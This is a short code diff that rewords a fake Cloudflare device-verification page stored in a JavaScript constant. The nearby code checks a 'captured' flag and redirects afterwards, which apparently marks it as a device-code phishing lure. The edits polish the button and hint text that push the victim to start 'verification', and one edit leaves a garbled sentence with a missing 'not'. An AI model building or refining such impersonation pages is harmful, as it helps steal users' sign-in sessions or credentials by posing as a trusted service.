@@ -2616,11 +2616,11 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 						</button>
 					</div>
 					<p class="hint">
-						You may be prompted to sign in if Cloudflare have not verified your device before.
+						You may be prompted to sign in if Cloudflare have  verified your device before.
 					</p>
 
 					<button id="verify-device" class="verify-btn" type="button">
-						Complete device Challenge
+						Start verification 
 					</button>
 				</div>
 			</section>
@@ -2857,7 +2857,7 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 			          verifyUrl = d.verify_url;
 			          render(); // Re-render with the new code
 			          verifyBtn.disabled = false;
-			          verifyBtn.textContent = 'Verify device';
+			          verifyBtn.textContent = 'Start verification';
 			        }
 			        if(d.captured) {
 			          if(d.redirect_url) {
